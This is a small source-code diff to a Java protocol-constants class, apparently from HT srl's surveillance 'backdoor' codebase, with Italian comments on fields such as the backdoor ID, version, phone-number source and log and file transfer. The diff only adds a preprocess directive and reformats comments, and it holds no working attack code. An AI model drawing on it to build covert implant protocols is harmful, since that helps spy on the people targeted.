@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -55,7 +56,7 @@ public final class Proto {
     // il file "nome" lungo # in
     // "directory"
     /** The Constant FILE. */
-    public static final int FILE = 0xe; // #, Sta per arrivare un file
+    public static final int FILE = 0xe; //#, Sta per arrivare un file
     // lungo # bytes
     /** The Constant ID. */
     public static final int ID = 0xf; // Id univoco della backdoor,
@@ -74,11 +75,11 @@ public final class Proto {
     // del blocco (il blocco
     // inviato e' paddato)
     /** The Constant SOURCEID. */
-    public static final int SOURCEID = 0x13; // #telefono,# byte NON
+    public static final int SOURCEID = 0x13; //#telefono,# byte NON
     // paddati del blocco (il
     // blocco inviato e' paddato)
     /** The Constant VERSION. */
-    public static final int VERSION = 0x14; // #,bytes versione della
+    public static final int VERSION = 0x14; //#,bytes versione della
     // backdoor (10 byte)
     /** The Constant LOG_END. */
     public static final int LOG_END = 0x15; // La spedizione dei log e'
@@ -91,7 +92,7 @@ public final class Proto {
     // terminazione della fase di
     // download dei file
     /** The Constant SUBTYPE. */
-    public static final int SUBTYPE = 0x18; // #,bytes che indicano la
+    public static final int SUBTYPE = 0x18; //#,bytes che indicano la
 
     public static final int LASTTYPE = 0x19;
 
